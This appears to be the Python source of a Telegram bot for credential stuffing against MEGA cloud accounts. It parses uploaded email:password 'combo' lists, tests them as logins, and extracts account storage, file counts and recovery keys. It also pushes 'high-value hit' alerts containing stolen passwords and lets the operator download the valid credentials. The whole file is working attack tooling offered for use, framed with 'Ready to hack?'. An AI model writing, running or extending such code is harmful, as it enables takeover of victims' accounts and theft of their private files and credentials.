"""
Credential Testing Bot - Telegram Commands
Upload combos → Test validity → Find breaches → Extract info → Get results
"""

import logging
import asyncio
from telegram import Update, File
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from pathlib import Path
import json
from datetime import datetime

logger = logging.getLogger(__name__)


class CredentialTestingBot:
    """Telegram bot for automated credential testing"""
    
    def __init__(self, credential_tester, admin_user_id: int):
        self.tester = credential_tester
        self.admin_id = admin_user_id
        self.active_tests = {}  # {chat_id: test_data}
        self.results_dir = Path("results")
        self.results_dir.mkdir(exist_ok=True)
        
        logger.info("✅ CredentialTestingBot initialized")
    
    def is_admin(self, user_id: int) -> bool:
        """Check if user is admin"""
        return user_id == self.admin_id
    
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Welcome message"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        message = """
🔓 **Credential Testing System**

**🎯 What I Do:**
• Test email:password validity (MEGA accounts)
• Find ALL breached passwords for each email
• Extract account information (storage, files, recovery keys)
• Calculate risk scores
• Provide detailed reports

**📁 How to Use:**
1. Upload combo file (.txt)
2. I'll auto-detect and test all credentials
3. Get instant hits and breach alerts
4. Download complete reports

**⚡ Commands:**
• `/status` - System status
• `/stats` - Testing statistics
• `/test_combos` - Test uploaded combos
• `/get_hits` - Download valid credentials
• `/get_breaches` - Download breach report
• `/stop` - Stop current test

**🚀 Ready to hack?** Upload a combo file to begin!

Format: `email:password` (one per line)
"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show system status"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        chat_id = update.effective_chat.id
        active_test = self.active_tests.get(chat_id)
        stats = self.tester.get_stats()
        
        message = "📊 **System Status**\n\n"
        
        if active_test:
            progress = active_test.get('progress', {})
            message += f"🔄 **Active Test:**\n"
            message += f"• Stage: {progress.get('stage', 'Unknown')}\n"
            message += f"• Progress: {progress.get('current', 0)}/{progress.get('total', 0)}\n"
            message += f"• Message: {progress.get('message', 'Processing...')}\n\n"
        else:
            message += "✅ **Status:** Idle\n\n"
        
        message += f"📈 **Total Statistics:**\n"
        message += f"• Tested: {stats['total_tested']:,}\n"
        message += f"• Valid: {stats['valid_credentials']:,}\n"
        message += f"• Invalid: {stats['invalid_credentials']:,}\n"
        message += f"• Breached: {stats['breached_emails']:,}\n"
        message += f"• High Risk: {stats['high_risk_accounts']:,}\n"
        message += f"• Data Extracted: {stats['data_extracted']:,}\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    async def cmd_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Detailed statistics"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        stats = self.tester.get_stats()
        
        message = "📊 **Detailed Statistics**\n\n"
        message += f"**Credentials Tested:**\n"
        message += f"• Total: {stats['total_tested']:,}\n"
        message += f"• Valid: {stats['valid_credentials']:,} ({stats['valid_credentials']/max(stats['total_tested'],1)*100:.1f}%)\n"
        message += f"• Invalid: {stats['invalid_credentials']:,} ({stats['invalid_credentials']/max(stats['total_tested'],1)*100:.1f}%)\n\n"
        
        message += f"**Breach Detection:**\n"
        message += f"• Breached Emails: {stats['breached_emails']:,}\n"
        message += f"• High Risk Accounts: {stats['high_risk_accounts']:,}\n\n"
        
        message += f"**Data Extraction:**\n"
        message += f"• Accounts with Data: {stats['data_extracted']:,}\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle uploaded combo files"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        chat_id = update.effective_chat.id
        
        # Check if already testing
        if chat_id in self.active_tests:
            await update.message.reply_text("⚠️ Test already in progress! Use /stop to cancel.")
            return
        
        try:
            # Download file
            file = await update.message.document.get_file()
            file_path = Path(f"temp_{chat_id}_{file.file_id}.txt")
            await file.download_to_drive(file_path)
            
            # Parse combos
            combos = []
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            email, password = parts[0].strip(), parts[1].strip()
                            if email and password:
                                combos.append((email, password))
            
            if not combos:
                await update.message.reply_text("❌ No valid combos found! Format: email:password")
                file_path.unlink()
                return
            
            # Determine if we should check breaches (rate limited to 40/min)
            # For large lists, breach checking takes too long
            check_breaches = len(combos) <= 1000  # Only check breaches for small lists
            
            breach_msg = ""
            if not check_breaches:
                breach_msg = f"\n⚠️ **Breach checking disabled** (list too large: {len(combos):,} combos)\n   Only MEGA validation will run"
            
            # Start testing
            await update.message.reply_text(
                f"✅ **Combo file received!**\n\n"
                f"📊 Found {len(combos):,} combos\n"
                f"🔍 MEGA validation: ✅ Enabled\n"
                f"🔥 Breach detection: {'✅ Enabled' if check_breaches else '❌ Disabled (>1000 combos)'}\n\n"
                f"🚀 Starting credential testing...\n"
                f"Use /status to check progress{breach_msg}",
                parse_mode=ParseMode.MARKDOWN
            )
            
            # Store active test
            self.active_tests[chat_id] = {
                'combos': combos,
                'file_path': file_path,
                'start_time': datetime.now(),
                'progress': {},
                'check_breaches': check_breaches
            }
            
            # Run test in background
            asyncio.create_task(self._run_credential_test(chat_id, combos, update))
        
        except Exception as e:
            logger.error(f"Error handling document: {e}")
            await update.message.reply_text(f"❌ Error: {e}")
            if chat_id in self.active_tests:
                del self.active_tests[chat_id]
    
    async def _run_credential_test(self, chat_id: int, combos: list, update: Update):
        """Run credential test in background"""
        try:
            results = []
            last_log_time = 0
            
            def progress_callback(stage, current, total, message):
                """Update progress"""
                nonlocal last_log_time
                
                if chat_id in self.active_tests:
                    self.active_tests[chat_id]['progress'] = {
                        'stage': stage,
                        'current': current,
                        'total': total,
                        'message': message
                    }
                
                # Throttle logging to every 2 seconds
                import time
                current_time = time.time()
                if current_time - last_log_time >= 2:
                    logger.info(f"Progress [{stage}]: {current}/{total} - {message}")
                    last_log_time = current_time
            
            # Run tests
            results = await self.tester.test_combos(
                combos,
                check_mega=True,
                check_breaches=self.active_tests[chat_id].get('check_breaches', False),
                progress_callback=progress_callback
            )
            
            # Save results
            saved_files = self.tester.save_results(results, self.results_dir / str(chat_id))
            
            # Store results
            if chat_id in self.active_tests:
                self.active_tests[chat_id]['results'] = results
                self.active_tests[chat_id]['saved_files'] = saved_files
                self.active_tests[chat_id]['end_time'] = datetime.now()
            
            # Send completion message
            stats = self.tester.get_stats()
            elapsed = (datetime.now() - self.active_tests[chat_id]['start_time']).total_seconds()
            
            completion_msg = f"""
🎉 **Testing Complete!**

⏱️ **Time:** {int(elapsed//60)}m {int(elapsed%60)}s
📊 **Results:**
• Total Tested: {len(combos):,}
• Valid Credentials: {len([r for r in results if r.get('mega_valid')]):,}
• Breached Emails: {len([r for r in results if r.get('email_breached')]):,}
• High Risk: {len([r for r in results if r.get('overall_risk_level') in ['HIGH', 'CRITICAL']]):,}

**📥 Download Results:**
• `/get_hits` - Valid credentials
• `/get_breaches` - Breach report
• `/get_report` - Full JSON report
"""
            
            await update.message.reply_text(completion_msg, parse_mode=ParseMode.MARKDOWN)
            
            # Send instant alerts for high-value hits
            high_value = [r for r in results if r.get('mega_valid') and 
                         (r.get('mega_account_type') == 'PRO' or r.get('mega_files', 0) > 100)]
            
            for hit in high_value[:5]:  # Send first 5 high-value hits
                hit_msg = f"""
🎯 **HIGH-VALUE HIT FOUND!**

📧 **Email:** `{hit['email']}`
🔑 **Password:** `{hit['password']}`
🛡️ **Recovery Key:** `{hit.get('mega_recovery_key', 'N/A')}`

📊 **Account:**
• Type: {hit['mega_account_type']}
• Storage: {hit['mega_storage_gb']} GB ({hit['mega_used_gb']} GB used)
• Files: {hit['mega_files']} | Folders: {hit['mega_folders']}

🔥 **Security:**
• Breaches: {hit['breach_count']}
• Password Seen: {hit['password_seen_count']} times
• Risk: {hit['overall_risk_level']} ({hit['overall_risk_score']}/100)
"""
                await update.message.reply_text(hit_msg, parse_mode=ParseMode.MARKDOWN)
        
        except Exception as e:
            logger.error(f"Error in credential test: {e}")
            await update.message.reply_text(f"❌ Test failed: {e}")
        
        finally:
            # Cleanup
            if chat_id in self.active_tests:
                file_path = self.active_tests[chat_id].get('file_path')
                if file_path and Path(file_path).exists():
                    Path(file_path).unlink()
    
    async def cmd_get_hits(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send hits file"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        chat_id = update.effective_chat.id
        test_data = self.active_tests.get(chat_id)
        
        if not test_data or 'saved_files' not in test_data:
            await update.message.reply_text("❌ No test results available")
            return
        
        hits_file = test_data['saved_files'].get('hits_file')
        if hits_file and Path(hits_file).exists():
            await update.message.reply_document(
                document=open(hits_file, 'rb'),
                caption="🎯 Valid Credentials (Hits)"
            )
        else:
            await update.message.reply_text("❌ No hits found")
    
    async def cmd_get_breaches(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send breach report"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        chat_id = update.effective_chat.id
        test_data = self.active_tests.get(chat_id)
        
        if not test_data or 'saved_files' not in test_data:
            await update.message.reply_text("❌ No test results available")
            return
        
        breach_file = test_data['saved_files'].get('breached_file')
        if breach_file and Path(breach_file).exists():
            await update.message.reply_document(
                document=open(breach_file, 'rb'),
                caption="🔥 Breached Emails Report"
            )
        else:
            await update.message.reply_text("❌ No breached emails found")
    
    async def cmd_get_report(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send full JSON report"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        chat_id = update.effective_chat.id
        test_data = self.active_tests.get(chat_id)
        
        if not test_data or 'saved_files' not in test_data:
            await update.message.reply_text("❌ No test results available")
            return
        
        report_file = test_data['saved_files'].get('report_file')
        if report_file and Path(report_file).exists():
            await update.message.reply_document(
                document=open(report_file, 'rb'),
                caption="📊 Full Test Report (JSON)"
            )
        else:
            await update.message.reply_text("❌ Report not found")
    
    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Stop current test"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        chat_id = update.effective_chat.id
        
        if chat_id in self.active_tests:
            # Request stop
            self.tester.mega_auth.stop()
            
            # Cleanup
            file_path = self.active_tests[chat_id].get('file_path')
            if file_path and Path(file_path).exists():
                Path(file_path).unlink()
            
            del self.active_tests[chat_id]
            
            await update.message.reply_text("🛑 Test stopped")
        else:
            await update.message.reply_text("❌ No active test")
    
    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show help"""
        if not self.is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Unauthorized")
            return
        
        message = """
🔓 **Credential Testing Bot - Help**

**📁 Upload Combos:**
Upload a .txt file with email:password combinations (one per line)

**⚡ Commands:**
• `/start` - Welcome message
• `/status` - Current system status
• `/stats` - Detailed statistics
• `/get_hits` - Download valid credentials
• `/get_breaches` - Download breach report
• `/get_report` - Download full JSON report
• `/stop` - Stop current test
• `/help` - This help message

**📊 What Gets Tested:**
1. MEGA account validity
2. Account type (Pro/Free/Empty)
3. Storage and file counts
4. Recovery keys
5. Email breach history
6. Password breach frequency
7. Overall risk assessment

**🎯 Results Include:**
• Valid credentials with full account details
• Breach reports with historical data
• Risk scores (0-100) and levels
• Comprehensive JSON data

**💡 Tips:**
• Use clean, deduplicated combo lists
• Monitor /status during long tests
• Download results immediately after completion
• High-value hits are sent as instant alerts
"""
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
